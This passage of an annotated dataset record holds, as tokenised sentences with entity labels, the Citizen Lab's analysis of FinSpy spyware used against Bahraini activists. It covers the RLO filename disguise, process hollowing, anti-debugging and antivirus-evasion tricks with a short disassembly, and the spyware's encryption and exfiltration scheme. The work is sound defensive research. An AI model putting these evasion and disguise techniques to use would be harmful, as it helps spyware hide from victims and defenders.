[0, 5], "sent_id": 99, "type": "Time"}], [{"name": "XXY1TTTTTTTT.dat", "pos": [15, 16], "sent_id": 103, "type": "Indicator"}], [{"name": "AES-256-CBC", "pos": [8, 11], "sent_id": 107, "type": "Obfuscation"}], [{"name": "%USERPROFILE%\\Local Settings\\Temp\\smtXX.tmp", "pos": [13, 16], "sent_id": 138, "type": "File"}], [{"name": "smtXX.tmp", "pos": [3, 4], "sent_id": 140, "type": "File"}], [{"name": "1431028D41FD.dat", "pos": [24, 25], "sent_id": 141, "type": "File"}], [{"name": "77.69.140.194", "pos": [17, 18], "sent_id": 153, "type": "Address"}], [{"name": "WHOIS", "pos": [21, 22], "sent_id": 153, "type": "Organization"}], [{"name": "Batelco", "pos": [30, 31], "sent_id": 153, "type": "Organization"}], [{"name": "192.168.131.65", "pos": [3, 4], "sent_id": 158, "type": "Address"}], [{"name": "77.69.140.194", "pos": [6, 7], "sent_id": 158, "type": "Address"}], [{"name": "192.168.131.65", "pos": [9, 10], "sent_id": 158, "type": "Address"}], [{"name": "77.69.149.194", "pos": [12, 13], "sent_id": 158, "type": "Address"}], [{"name": "finspyv4.01", "pos": [14, 15], "sent_id": 161, "type": "Malware"}], [{"name": "finspyv2", "pos": [18, 19], "sent_id": 161, "type": "Malware"}], [{"name": "c488a8aaef0df577efdf1b501611ec20", "pos": [6, 7], "sent_id": 178, "type": "MD5"}], [{"name": "5ea6ae50063da8354e8500d02d0621f643827346", "pos": [9, 10], "sent_id": 178, "type": "SHA-1"}], [{"name": "81531ce5a248aead7cda76dd300f303dafe6f1b7a4c953ca4d7a9a27b5cd6cdf", "pos": [12, 13], "sent_id": 178, "type": "SHA-256"}], [{"name": "tiger.gamma-international.de", "pos": [0, 1], "sent_id": 180, "type": "Indicator"}], [{"name": "ff-demo.blogdns.org", "pos": [1, 2], "sent_id": 180, "type": "Indicator"}], [{"name": "Martin Muench", "pos": [3, 5], "sent_id": 182, "type": "Person"}], [{"name": "Gamma International GmbH", "pos": [0, 3], "sent_id": 183, "type": "Organization"}], [{"name": "Munich", "pos": [2, 3], "sent_id": 187, "type": "Location"}], [{"name": "info@gamma-international.de", "pos": [2, 3], "sent_id": 189, "type": "Email"}], [{"name": "2011-04-04T11:24:20+02:00", "pos": [2, 9], "sent_id": 190, "type": "Time"}], [{"name": "ff-demo.blogdns.org", "pos": [5, 6], "sent_id": 194, "type": "Indicator"}]], "labels": [{"r": "P17", "h": 2, "t": 1, "evidence": [3]}, {"r": "P21", "h": 38, "t": 39, "evidence": [49, 52]}], "title": "201207CitizenLabFinFisher", "sents": [["Research", "Brief", "July", "2012", "The", "Citizen", "Lab", "From", "Bahrain", "with", "Love", ":"], ["FinFisher", "\u2019s", "Spy", "Kit", "Exposed", "?"], ["Author", ":", "Morgan", "Marquis", "-", "Boire", "INTRODUCTION"], ["The", "FinFisher", "Suite", "is", "described", "by", "its", "distributors", ",", "Gamma", "International", "UK", "Ltd.", ",", "as", "\"", "Governmental", "IT", "Intrusion", "and", "Remote", "Monitoring", "Solutions", ".", "\""], ["1", "The", "toolset", "first", "gained", "notoriety", "after", "it", "was", "revealed", "that", "the", "Egyptian", "Government", "\u2019s", "state", "security", "apparatus", "had", "been", "involved", "in", "negotiations", "with", "Gamma", "International", "UK", "Ltd.", "over", "the", "purchase", "of", "the", "software", "."], ["Promotional", "materials", "have", "been", "leaked", "that", "describe", "the", "tools", "as", "providing", "a", "wide", "range", "of", "intrusion", "and", "monitoring", "capabilities.2", "Despite", "this", ",", "however", ",", "the", "toolset", "itself", "has", "not", "been", "publicly", "analyzed", "."], ["This", "post", "contains", "analysis", "of", "several", "pieces", "of", "malware", "obtained", "by", "Vernon", "Silver", "of", "Bloomberg", "News", "that", "were", "sent", "to", "Bahraini", "pro", "-", "democracy", "activists", "in", "April", "and", "May", "of", "this", "year", "."], ["The", "purpose", "of", "this", "work", "is", "identification", "and", "classification", "of", "the", "malware", "to", "better", "understand", "the", "actors", "behind", "the", "attacks", "and", "the", "risk", "to", "victims", "."], ["In", "order", "to", "accomplish", "this", ",", "we", "undertook", "several", "different", "approaches", "during", "the", "investigation", "."], ["As", "well", "as", "directly", "examining", "the", "samples", "through", "static", "and", "dynamic", "analysis", ",", "we", "infected", "a", "virtual", "machine"], ["(", "VM", ")", "with", "the", "malware", "."], ["We", "monitored", "the", "filesystem", ",", "network", ",", "and", "running", "operating", "system", "of", "the", "infected", "VM", "."], ["This", "analysis", "suggests", "the", "use", "of", "\u201c", "Finspy", "\u201d", ",", "part", "of", "the", "commercial", "intrusion", "kit", ",", "Finfisher", ",", "distributed", "by", "Gamma", "International", "."], ["July", "2012", "DELIVERY"], ["This", "section", "describes", "how", "the", "malware", "was", "delivered", "to", "potential", "victims", "using", "e", "-", "mails", "with", "malicious", "attachments", "."], ["In", "early", "May", ",", "we", "were", "alerted", "that", "Bahraini", "activists", "were", "targeted", "with", "apparently", "malicious", "e", "-", "mails", "."], ["The", "emails", "ostensibly", "pertained", "to", "the", "ongoing", "turmoil", "in", "Bahrain", ",", "and", "encouraged", "recipients", "to", "open", "a", "series", "of", "suspicious", "attachments", "."], ["The", "screenshot", "below", "is", "indicative", "of", "typical", "message", "content", ":", "The", "attachments", "to", "the", "e", "-", "mails", "we", "have", "been", "able", "to", "analyze", "were", "typically", ".rar", "files", ",", "which", "we", "found", "to", "contain", "malware", "."], ["Note", "that", "the", "apparent", "sender", "has", "an", "e", "-", "mail", "address", "that", "indicates", "that", "it", "was", "being", "sent", "by", "\u201c", "Melissa", "Chan", ",", "\u201d", "who", "is", "a", "real", "correspondent", "for", "Aljazeera", "English", "."], ["We", "suspect", "that", "the", "e", "-", "mail", "address", "is", "not", "her", "real", "address.3"], ["The", "following", "samples", "were", "examined", ":", "324783fbc33ec117f971cca77ef7ceaf7ce229a74edd6e2b3bd0effd9ed10dcc", "rar.\u202b\u0627\u0644\u0641\u0639\u0627\u0644\u064a\u0627\u062a\u202c", "c5b39d98c85b21f8ac1bedd91f0b6510ea255411cf19c726545c1d0a23035914", "_", "gpj.ArrestedXSuspects.rar"], ["c5b37bb3620d4e7635c261e5810d628fc50e4ab06b843d78105a12cfbbea40d7", "KingXhamadXonXofficialXvisitXtoX.rar", "80fb86e265d44fbabac942f7b26c973944d2ace8a8268c094c3527b83169b3cc", "MeetingXAgenda.rar", "f846301e7f190ee3bb2d3821971cc2456617edc2060b07729415c45633a5a751", "Rajab.rar"], ["These", "contained", "executables", "masquerading", "as", "picture", "files", "or", "documents", ":", "49000fc53412bfda157417e2335410cf69ac26b66b0818a3be7eff589669d040", "dialoge.exe", "cc3b65a0f559fa5e6bf4e60eef3bffe8d568a93dbb850f78bdd3560f38218b5c", "exe.Rajab1.jpg", "39b325bd19e0fe6e3e0fca355c2afddfe19cdd14ebda7a5fc96491fc66e0faba", "exe.image1.jpg", "e48bfeab2aca1741e6da62f8b8fc9e39078db574881691a464effe797222e632", "exe.Rajab.jpg", "2ec6814e4bad0cb03db6e241aabdc5e59661fb580bd870bdb50a39f1748b1d14", "exe", ".", "Arrested", "Suspects.jpg", "c29052dc6ee8257ec6c74618b6175abd6eb4400412c99ff34763ff6e20bab864", "News", "about", "the", "existence", "of", "a", "new", "dialogue", "between", "AlWefaq", "&", "Govt", "..", "doc", "2", "July", "2012"], ["The", "emails", "generally", "suggested", "that", "the", "attachments", "contained", "political", "content", "of", "interest", "to", "pro", "-", "democracy", "activists", "and", "dissidents", "."], ["In", "order", "to", "disguise", "the", "nature", "of", "the", "attachments", "a", "malicious", "usage", "of", "the", "\u201c", "righttoleftoverride", "\"", "(", "RLO", ")", "character", "was", "employed", "."], ["The", "RLO", "character", "(", "U+202e", "in", "unicode", ")", "controls", "the", "positioning", "of", "characters", "in", "text", "containing", "characters", "flowing", "from", "right", "to", "left", ",", "such", "as", "Arabic", "or", "Hebrew", "."], ["The", "malware", "appears", "on", "a", "victim", "\u2019s", "desktop", "as", "\"", "exe.Rajab1.jpg", "\"", "(", "for", "example", ")", ",", "along", "with", "the", "default"], ["Windows", "icon", "for", "a", "picture", "file", "without", "thumbnail", "."], ["But", ",", "when", "the", "UTF-8", "based", "filename", "is", "displayed", "in", "ANSI", ",", "the", "name", "is", "displayed", "as", "\"", "gpj.1bajaR.exe", "\u201d", "."], ["Believing", "that", "they", "are", "opening", "a", "harmless", "\u201c", ".jpg", "\u201d", ",", "victims", "are", "instead", "tricked", "into", "running", "an", "executable", "\"", ".exe", "\""], ["file.4", "Upon", "execution", "these", "files", "install", "a", "multi", "-", "featured", "trojan", "on", "the", "victim", "\u2019s", "computer", "."], ["This", "malware", "provides", "the", "attacker", "with", "clandestine", "remote", "access", "to", "the", "victim", "\u2019s", "machine", "as", "well", "as", "comprehensive", "data", "harvesting", "and", "exfiltration", "capabilities", "."], ["INSTALLATION"], ["This", "section", "describes", "how", "the", "malware", "infects", "the", "target", "machine", "."], ["The", "malware", "displays", "a", "picture", "as", "expected", "."], ["This", "differs", "from", "sample", "to", "sample", "."], ["The", "sample", "\u201c", "Arrested", "Suspects.jpg", "\u201d", "(", "\u201c", "gpj.stcepsuS", "detserrA.exe", "\u201d", ")", "displays", ":", "3", "July", "2012", "It", "additionally", "creates", "a", "directory", "(", "which", "appears", "to", "vary", "from", "sample", "to", "sample", "):", "C:\\Documents", "and", "Settings\\XPMUser\\Local", "Settings\\Temp\\TMP51B7AFEF"], ["It", "copies", "itself", "there", "(", "in", "this", "case", "the", "malware", "appears", "as", "\u201c", "Arrested", "Suspects.jpg", "\u201d", ")", "where", "it", "is", "renamed", ":", "C:\\Documents", "and", "Settings\\XPMUser\\Local", "Settings\\Temp\\TMP51B7AFEF\\Arrested", "Suspects.jpg", "\u201d", "=", ">", "C:\\Documents", "and", "Settings\\XPMUser\\Local", "Settings\\Temp\\TMP51B7AFEF\\tmpD.tmp"], ["Then", "it", "drops", "the", "following", "files", ":"], ["C:\\DOCUME~1\\%USER%\\LOCALS~1\\Temp\\delete.bat", "C:\\DOCUME~1\\%USER%\\LOCALS~1\\Temp\\driverw.sys"], ["It", "creates", "the", "folder", "(", "the", "name", "of", "which", "varies", "from", "host", "to", "host", "):", "C:\\Documents", "and", "Settings\\%USER%\\Application", "Data\\Microsoft\\Installer\\{5DA45CC9", "-", "D840", "-", "47CC9F86", "-", "FD2E9A718A41", "}"], ["This", "process", "is", "observable", "on", "the", "filesystem", "timeline", "of", "the", "infected", "host", "(", "click", "image", "to", "enlarge", "):", "\u201c", "driverw.sys", "\u201d", "is", "loaded", "and", "then", "\u201c", "delete.bat", "\u201d", "is", "run", "which", "deletes", "the", "original", "payload", "and", "itself", "."], ["It", "then", "infects", "existing", "operating", "system", "processes", ",", "connects", "to", "the", "command", "and", "control", "server", ",", "and", "begins", "data", "harvesting", "and", "exfiltration", "."], ["4", "July", "2012", "Examining", "the", "memory", "image", "of", "a", "machine", "infected", "with", "the", "malware", "shows", "that", "a", "technique", "for", "infecting", "processes", "known", "as", "\u201c", "process", "hollowing", "\"", "is", "used", "."], ["For", "example", ",", "the", "memory", "segment", "below", "from", "the", "\u201c", "winlogon.exe", "\u201d", "process", "is", "marked", "as", "executable", "and", "writeable", ":"], ["Here", "the", "malware", "starts", "a", "new", "instance", "of", "a", "legitimate", "process", "such", "as", "\u201c", "winlogon.exe", "\u201d", "and", "before", "the", "process", "\u2019s", "first", "thread", "begins", ",", "the", "malware", "de", "-", "allocates", "the", "memory", "containing", "the", "legitimate", "code", "and", "injects", "malicious", "code", "in", "its", "place", "."], ["Dumping", "and", "examining", "this", "memory", "segment", "reveals", "the", "following", "strings", "in", "the", "infected", "process", ":", "Note", "the", "string", ":", "y:\\lsvn_branches\\finspyv4.01\\finspyv2\\src\\libs\\libgmp\\mpn", "-", "tdiv_qr.c", "5", "July", "2012"], ["This", "file", "seems", "to", "correspond", "to", "a", "file", "in", "the", "GNU", "Multi", "-", "Precision", "arithmetic", "library", ":", "http://gmplib.org:8000/gmp/file/b5ca16212198/mpn/generic/tdiv_qr.c"], ["The", "process", "\u201c", "svchost.exe", "\u201d", "was", "also", "found", "to", "be", "infected", "in", "a", "similar", "manner", ":", "6", "July", "2012", "Further", "examination", "of", "the", "memory", "dump", "also", "reveals", "the", "following", ":", "This", "path", "appears", "to", "reference", "the", "functionality", "that", "the", "malware", "uses", "to", "modify", "the", "boot", "sequence", "to", "enable", "persistence", ":"], ["y:\\lsvn_branches\\finspyv4.01\\finspyv2\\src\\target\\bootkit_x32driver\\objfre_w2k_x86\\i386\\bootkit_x32driv", "er.pdb"], ["A", "pre", "-", "infection", "vs", "post", "-", "infection", "comparison", "of", "the", "infected", "VM", "shows", "that", "the", "Master", "Boot", "Record", "(", "MBR", ")", "was", "modified", "by", "code", "injected", "by", "the", "malware", "."], ["The", "strings", "found", "in", "memory", "\u201c", "finspyv4.01", "\u201d", "and", "\u201c", "finspyv2", "\u201d", "are", "particularly", "interesting", "."], ["The", "FinSpy", "tool", "is", "part", "of", "the", "FinFisher", "intrusion", "and", "monitoring", "toolkit.5", "OBFUSCATION", "AND", "EVASION"], ["This", "section", "describes", "how", "the", "malware", "is", "designed", "to", "resist", "analysis", "and", "evade", "identification", "."], ["The", "malware", "employs", "a", "myriad", "of", "techniques", "designed", "to", "evade", "detection", "and", "frustrate", "analysis", "."], ["While", "investigation", "into", "this", "area", "is", "far", "from", "complete", ",", "we", "discuss", "several", "discovered", "methods", "as", "examples", "of", "the", "lengths", "taken", "by", "the", "developers", "to", "avoid", "identification", "."], ["A", "virtualised", "packer", "is", "used", "."], ["This", "type", "of", "obfuscation", "is", "used", "by", "those", "that", "have", "\u201c", "strong", "motives", "to", "prevent", "their", "malware", "from", "being", "analyzed\u201d.6"], ["This", "converts", "the", "native", "x86", "instructions", "of", "the", "malware", "into", "another", "custom", "language", "chosen", "from", "one", "of", "11", "code", "templates", "."], ["At", "run", "-", "time", ",", "this", "is", "interpreted", "by", "an", "obfuscated", "interpreter", "customized", "for", "that", "particular", "language", "."], ["This", "virtualised", "packer", "was", "not", "recognised", "and", "appears", "to", "be", "bespoke", "."], ["7", "July", "2012", "Several", "anti", "-", "debugging", "techniques", "are", "used", "."], ["This", "section", "of", "code", "crashes", "the", "popular", "debugger", ",", "OllyDbg", "."], [".text:00401683", "finit", ".text:00401686"], ["fld", "ds", ":", "tbyte_40168E", ".text:0040168C"], ["jmp", "short", "locret_401698", "--------------------------------------------------------------------.text:0040168E"], ["tbyte_40168E", "dt", "9.2233720368547758075e18"], ["--------------------------------------------------------------------.text:00401698", "locret_401698", ":", ".text:00401698", "retn"], ["This", "float", "value", "causes", "OllyDbg", "to", "crash", "when", "trying", "to", "display", "its", "value", "."], ["A", "more", "detailed", "explanation", "of", "this", "can", "be", "found", "here", "."], ["To", "defeat", "DbgBreakPoint", "based", "debuggers", ",", "the", "malware", "finds", "the", "address", "of", "DbgBreakPoint", ",", "makes", "the", "page", "EXECUTE_READWRITE", "and", "writes", "a", "NOP", "on", "the", "entry", "point", "of", "DbgBreakPoint", "."], ["The", "malware", "checks", "via", "PEB", "to", "detect", "whether", "or", "not", "it", "is", "being", "debugged", ",", "and", "if", "it", "is", "it", "returns", "a", "random", "address", "."], ["The", "malware", "calls", "ZwSetInformationThread", "with", "ThreadInformationClass", "set", "to", "0x11", ",", "which", "causes", "the", "thread", "to", "be", "detached", "from", "the", "debugger", "."], ["The", "malware", "calls", "ZwQueryInformationProcess", "with", "ThreadInformationClass", "set", "to", "0x(ProcessDebugPort", ")"], ["and", "0x1e", "(", "ProcessDebugObjectHandle", ")", "to", "detect", "the", "presence", "of", "a", "debugger", "."], ["If", "a", "debugger", "is", "detected", "it", "jumps", "to", "a", "random", "address", "."], ["ZwQueryInformationProcess", "is", "also", "called", "to", "check", "the", "DEP", "status", "on", "the", "current", "process", ",", "and", "it", "disables", "it", "if", "it", "\u2019s", "found", "to", "be", "enabled", "."], ["The", "malware", "deploys", "a", "granular", "solution", "for", "Antivirus", "software", ",", "tailored", "to", "the", "AV", "present", "on", "the", "infected", "machine", "."], ["The", "malware", "calls", "ZwQuerySystemInformation", "to", "get", "ProcessInformation", "and", "ModuleInformation", "."], ["The", "malware", "then", "walks", "the", "list", "of", "processes", "and", "modules", "looking", "for", "installed", "AV", "software", "."], ["Our", "analysis", "indicates", "that", "the", "malware", "appears", "to", "have", "different", "code", "to", "Open", "/", "Create", "process", "and", "inject", "for", "each", "AV", "solution", "."], ["For", "some", "Anti", "-", "Virus", "software", "this", "even", "appears", "to", "be", "version", "dependent", "."], ["The", "function"], ["\u201c", "ZwQuerySystemInformation", "\u201d", "is", "also", "hooked", "by", "the", "malware", ",", "a", "technique", "frequently", "used", "to", "allow", "process", "hiding", ":", "8", "July", "2012", "DATA", "HARVESTING", "AND", "ENCRYPTION"], ["This", "section", "describes", "how", "the", "malware", "collects", "and", "encrypts", "data", "from", "the", "infected", "machine", "."], ["9", "July", "2012"], ["Our", "analysis", "showed", "that", "the", "malware", "collects", "a", "wide", "range", "of", "data", "from", "an", "infected", "victim", "."], ["The", "data", "is", "stored", "locally", "in", "a", "hidden", "directory", ",", "and", "is", "disguised", "with", "encryption", "prior", "to", "exfiltration", "."], ["\"", "C:\\Windows\\Installer\\{49FD463C-18F1", "-", "63C4", "-", "8F12", "-", "49F518F127", "}", ".", "\""], ["On", "the", "reference", "victim", "host", ",", "the", "directory", "was", ":"], ["We", "conducted", "forensic", "examination", "of", "the", "files", "created", "in", "this", "directory", "and", "identified", "a", "wide", "range", "of", "data", "collected", "."], ["Files", "in", "this", "directory", "were", "found", "to", "be", "screenshots", ",", "keylogger", "data", ",", "audio", "from", "Skype", "calls", ",", "passwords", "and", "more", "."], ["For", "the", "sake", "of", "brevity", "we", "include", "a", "limited", "set", "of", "examples", "here", "."], ["The", "malware", "attempts", "to", "locate", "the", "configuration", "and", "password", "store", "files", "for", "a", "variety", "browsers", "and", "chat", "clients", "as", "seen", "below", ":", "10", "July", "2012"], ["We", "observed", "the", "creation", "of", "the", "file", "\u201c", "t111o00000000.dat", "\u201d", "in", "the", "data", "harvesting", "directory", ",", "as", "shown", "in", "the", "filesystem", "timeline", "below", ":"], ["Thu", "Jun", "14", "2012", "12:31:34", "52719", "mac", "."], ["r", "/", "rr", "-", "xr", "-", "xr", "-", "x", "0", "0", "26395", "-", "128", "-", "5", "C:/WINDOWS", "/", "Installer/{49FD463C18F1", "-", "63C4", "-", "8F12", "-", "49F518F127}/09e493e2", "-", "05f9", "-", "4899", "-", "b661", "-", "c52f3554c644"], ["Thu", "Jun", "14", "2012", "12:32:18", "285691", "..."], ["b", "r", "/", "rrwxrwxrwx", "0", "0", "26397", "-", "128", "-", "4", "C:/WINDOWS", "/", "Installer/{49FD463C18F1", "-", "63C4", "-", "8F12", "-", "49F518F127}/t111o00000000.dat"], ["Thu", "Jun", "14", "2012", "12:55:12", "285691", "mac", "."], ["r", "/", "rrwxrwxrwx", "0", "0", "26397", "-", "128", "-", "4", "C:/WINDOWS", "/", "Installer/{49FD463C-18F1", "-", "63C4", "-", "8F12", "-", "49F518F127}/t111o00000000.dat", "4096", ".."], ["c.", "-/rr", "-", "xr", "-", "xr", "-", "x", "0", "0", "26447", "-", "128", "-", "4"], ["The", "infected", "process", "\u201c", "winlogon.exe", "\u201d", "was", "observed", "writing", "this", "file", "via", "Process", ":", "11", "July", "2012", "Examination", "of", "this", "file", "reveals", "that", "it", "is", "a", "screenshot", "of", "the", "desktop", ":", "Many", "other", "modules", "providing", "specific", "exfiltration", "capabilities", "were", "observed", "."], ["Generally", ",", "the", "exfiltration", "modules", "write", "files", "to", "disk", "using", "the", "following", "naming", "convention", ":", "XXY1TTTTTTTT.dat", "."], ["XX", "is", "a", "two", "-", "digit", "hexadecimal", "module", "number", ",", "Y", "is", "a", "single", "-", "digit", "hexadecimal", "submodule", "number", ",", "and", "TTTTTTTT", "is", "a", "hexadecimal", "representation", "of", "a", "unix", "timestamp", "(", "less", "1.3", "billion", ")", "associated", "with", "the", "file", "creation", "time", "."], ["ENCRYPTION"], ["The", "malware", "uses", "encryption", "in", "an", "attempt", "to", "disguise", "harvested", "data", "in", "the", ".dat", "files", "intended", "for", "exfiltration", "."], ["Data", "written", "to", "the", "files", "is", "encrypted", "using", "AES-256", "-", "CBC", "(", "with", "no", "padding", ")", "."], ["The", "32", "-", "byte", "key", "consists", "of", "8", "readings", "from", "memory", "address", "0x7ffe0014", ":", "a", "special", "address", "in", "Windows", "that", "contains", "the", "low", "-", "order-4", "-", "bytes", "of", "the", "number", "of", "hundred", "-", "nanoseconds", "since", "1", "January", "1601", "."], ["The", "IV", "consists", "of", "4", "additional", "readings", "."], ["The", "AES", "key", "structure", "is", "highly", "predictable", ",", "as", "the", "quantum", "for", "updating", "the", "system", "clock", "(", "HKLM\\SYSTEM\\CurrentControlSet\\Services\\W32Time\\Config\\LastClockRate", ")", "is", "set", "to"], ["12", "July", "2012", "0x2625A", "hundred", "-", "nanoseconds", "by", "default", ",", "and", "the", "clock", "readings", "that", "comprise", "the", "key", "and", "IV", "are", "taken", "in", "a", "tight", "loop", ":", "..."], ["0x406EA4", ":", "8D45C0", "LEA", "EAX,[EBP-0x40", "]", "0x406EA7", ":", "50", "PUSH", "EAX"], ["0x406EA8", ":"], ["FF150C10AF01", "CALL", "DWORD", "PTR", "[", "0x1AF100C", "]"], ["0x406EAE"], [":"], ["8B4DE8", "MOV", "ECX", ",", "DWORD", "PTR", "[", "EBP-0x18", "]", "0x406EB1", ":", "8B45C0", "MOV", "EAX", ",", "DWORD", "PTR", "[", "EBP-0x40", "]", "0x406EB4", ":", "8345E804", "ADD", "DWORD", "PTR", "[", "EBP-0x18],0x4", "0x406EB8", ":", "6A01"], ["PUSH", "0x1", "0x406EBA", ":", "89040F", "MOV", "DWORD", "PTR", "[", "EDI+ECX],EAX", "0x406EBD", ":", "FF152810AF01", "CALL", "DWORD", "PTR", "[", "0x1AF1028", "]"], ["0x406EC3", ":", "817DE800010000", "CMP", "DWORD", "PTR", "[", "EBP-0x18],0x100", "0x406ECA", ":", "72D8", "JB", "0x406EA4", "0x406ECC", ":", "80277F", "AND", "BYTE", "PTR", "[", "EDI],0x7F", "..."], ["The", "following", "AES", "keys", "were", "among", "those", "found", "to", "be", "used", "to", "encrypt", "records", "in", ".dat", "files", "."], ["The", "first", "contains", "the", "same", "4", "bytes", "repeated", ",", "whereas", "in", "the", "second", "key", ",", "the", "difference", "between", "all", "consecutive", "4", "-", "byte", "blocks", "(", "with", "byte", "order", "swapped", ")", "is", "0x2625A."], ["70", "31", "bd", "cc", "70", "31", "bd", "cc", "70", "31", "bd", "cc", "70", "31", "bd", "cc", "70", "31", "bd", "cc", "70", "31", "bd", "cc", "70", "31", "bd", "cc", "70", "31", "bd", "cc", "26", "e9", "23", "60", "80", "4b", "26", "60", "da", "ad", "28", "60", "34", "10", "2b", "60", "8e", "72", "2d", "60", "e8", "d4", "2f", "60", "42", "37", "32", "60", "9c", "99", "34", "60"], ["In", "all", ",", "64", "clock", "readings", "are", "taken", "."], ["The", "readings", "are", "encrypted", "using", "an", "RSA", "public", "key", "found", "in", "memory"], ["(", "whose", "modulus", "begins", "with", "A25A944E", ")", "and", "written", "to", "the", ".dat", "file", "before", "any", "other", "encrypted", "data", "."], ["No", "padding", "is", "used", "in", "the", "encryption", ",", "yielding", "exactly", "256", "encrypted", "bytes", "."], ["After", "the", "encrypted", "timestamp", "values", ",", "the", "file", "contains", "a", "number", "of", "records", "encrypted", "with", "AES", ",", "delimited", "by", "EAE9E8FF", "."], ["13", "July", "2012"], ["In", "reality", ",", "these", "records", "are", "only", "partially", "encrypted", ":", "if", "the", "record", "\u2019s", "length", "is", "not", "a", "multiple", "of", "16", "bytes", "(", "the", "AES", "block", "size", ")", ",", "then", "the", "remainder", "of", "the", "bytes", "are", "written", "to", "the", "file", "unencrypted", "."], ["For", "example", ",", "after", "typing", "\u201c", "FinSpy", "\u201d", "on", "the", "keyboard", ",", "the", "keylogger", "module", "produced", "the", "following", "(", "trailing", "plaintext", "highlighted", "):", "The", "predictability", "of", "the", "AES", "encryption", "keys", "allowed", "us", "to", "decrypt", "and", "view", "these", "partially", "-", "encrypted", "records", "in", "full", "plaintext", "."], ["The", "nature", "of", "the", "records", "depends", "on", "the", "particular", "module", "and", "submodule", "."], ["For", "example", ",", "submodule", "Y", "=", "=", "5", "of", "the", "Skype", "exfiltration", "module", "(", "XX", "=", "=", "14", ")", ",", "contains", "a", "csv", "representation", "of", "the", "user", "\u2019s", "contact", "list", ":", "Record", "#", "0"], ["Length", ":", "243", "bytes", ":", "\u00f3", "@\u00fe\u00ff\u00cc\u00b3\u00d0", "@"], ["\u00a4b\u00afOp\u00fe192.168.131.67JRecordingEcsv", "0\u00fe-0800UTC", "DST.1\u00fe2012", "-", "07", "-", "18", "18:00:21.:\u00fe1970", "-", "01", "-", "01"], ["00:16:00Abhwatch1", "Record", "#", "1", "Length", ":", "96", "bytes", ":", "`", "USERNAME", ",", "FULLNAME", ",", "COUNTRY", ",", "AUTHORIZED", ",", "BLOCKED"], ["Record", "#", "2", "Length", ":", "90", "bytes", ":", "Zecho123,Echo", "/", "Sound", "Test", "Service,,YES", ",", "NO", "Record", "#", "3", "Length", ":", "95", "bytes", ":", "^bhwatch2,Bahrain"], ["Watch", ",", "United", "States", ",", "YES", ",", "NO", "14", "July", "2012", "Submodule", "Y", "=", "=", "3", "records", "file", "transfers", "."], ["After", "a", "Skype", "file", "transfer", "concludes", ",", "the", "following", "file", "is", "created", ":", "%", "USERPROFILE%\\Local", "Settings\\Temp\\smtXX.tmp", "."], ["This", "file", "appears", "to", "contain", "the", "sent", "/", "received", "file", "."], ["As", "soon", "as", "smtXX.tmp", "is", "finished", "being", "written", "to", "disk", ",", "a", "file", "(", "1431XXXXXXXX.dat", ")", "is", "written", ",", "roughly", "the", "same", "size", "as", "smtXX.tmp", "."], ["After", "sending", "a", "picture", "(", "of", "birdshot", "shotgun", "shell", "casings", "used", "by", "Bahrain", "\u2019s", "police", ")", "to", "an", "infected", "Skype", "client", ",", "the", "file", "1431028D41FD.dat", "was", "observed", "being", "written", "to", "disk", "."], ["Decrypting", "it", "revealed", "the", "following", ":", "Record", "#", "0"], ["Length", ":", "441", "bytes", ":", "\u00b9", "@\u00fe\u00ff\u00cc\u00b3\u00d0", "@"], ["\u00a4b\u00afOp\u00fe192.168.131.67Abhwatch1Bbhwatch2\"CBahrain", "WatchIreceivedrC:\\Documents", "and", "Settings\\XPMUser\\My", "Documents\\gameborev3.jpgJRecording", "0\u00fe-0800UTC", "DST.1\u00fe2012", "-", "07", "-", "20", "12:18:21.:\u00fe2012", "-", "07", "-", "20", "12:18:21", "Record", "#", "1"], ["Length"], [":"], ["78247", "bytes", ":"], ["[", "Note", ":", "Record", "#", "1", "contained", "the", "contents", "of", "the", ".jpg", "file", ",", "preceded", "by", "hex", "A731010090051400", ",", "and", "followed", "by", "hex", "0A0A0A0A.", "]", "15", "July", "2012"], ["Additionally", ",", "submodule", "Y", "=", "=", "1", "records", "Skype", "chat", "messages", ",", "and", "submodule", "Y", "=", "=", "2", "records", "audio", "from", "all", "participants", "in", "a", "Skype", "call", "."], ["The", "call", "recording", "functionality", "appears", "to", "be", "provided", "by", "hooking"], ["DirectSoundCaptureCreate", ":", "COMMAND", "AND", "CONTROL"], ["This", "section", "describes", "the", "communications", "behavior", "of", "the", "malware", "."], ["When", "we", "examined", "the", "malware", "samples", "we", "found", "that", "they", "connect", "to", "a", "server", "at", "IP", "address", "77.69.140.194", "16", "July", "2012", "WHOIS", "data7", "reveals", "that", "this", "address", "is", "owned", "by", "Batelco", ",", "the", "principal", "telecommunications", "company", "of", "Bahrain", ":"], ["inetnum", ":", "77.69.128.0", "-", "77.69.159.255", "netname", ":", "ADSL"], ["descr", ":", "Batelco", "ADSL", "service", "country", ":", "bh"], ["For", "a", "period", "of", "close", "to", "10", "minutes", ",", "traffic", "was", "observed", "between", "the", "infected", "victim", "and", "the", "command", "and", "control", "host", "in", "Bahrain", "."], ["A", "summary", "of", "the", "traffic", "by", "port", "and", "conversation", "size", "(", "click", "image", "to", "enlarge", "):", "The", "infected", "VM", "talks", "to", "the", "remote", "host", "on", "the", "following", "five", "TCP", "ports", ":", "22", "53", "80", "443", "4111", "Based", "on", "observation", "of", "an", "infected", "machine", "we", "were", "able", "to", "determine", "that", "the", "majority", "of", "data", "is", "exfiltrated", "to", "the", "remote", "host", "via", "ports", "443", "and", "4111", "."], ["17", "July", "2012", "192.168.131.65:1213", "-", ">", "77.69.140.194:443", "1270075", "bytes", "192.168.131.65:4111", "-", ">", "77.69.149.194:4111", "4766223", "bytes", "CONCLUSIONS", "ABOUT", "MALWARE", "IDENTIFICATION"], ["Our", "analysis", "yields", "indicators", "about", "the", "identity", "of", "the", "malware", "we", "have", "analyzed", ":", "(", "1", ")", "debug", "strings", "found", "the", "in", "memory", "of", "infected", "processes", "appear", "to", "identify", "the", "product", "and", "(", "2", ")", "the", "samples", "have", "similarities", "with", "malware", "that", "communicates", "with", "domains", "belonging", "to", "Gamma", "International", "."], ["Debug", "Strings", "found", "in", "memory"], ["As", "we", "previously", "noted", ",", "infected", "processes", "were", "found", "containing", "strings", "that", "include", "\u201c", "finspyv4.01", "\u201d", "and", "\u201c", "finspyv2", "\u201d", ":", "y:\\lsvn_branches\\finspyv4.01\\finspyv2\\src\\libs\\libgmp\\mpn", "-", "tdiv_qr.c"], ["y:\\lsvn_branches\\finspyv4.01\\finspyv2\\src\\libs\\libgmp\\mpn", "-", "mul_fft.c", "y:\\lsvn_branches\\finspyv4.01\\finspyv2\\src\\target\\bootkit_x32driver\\objfre_w2k_x86\\i386\\bootkit_x32driv"], ["er.pdb", "Publicly", "available", 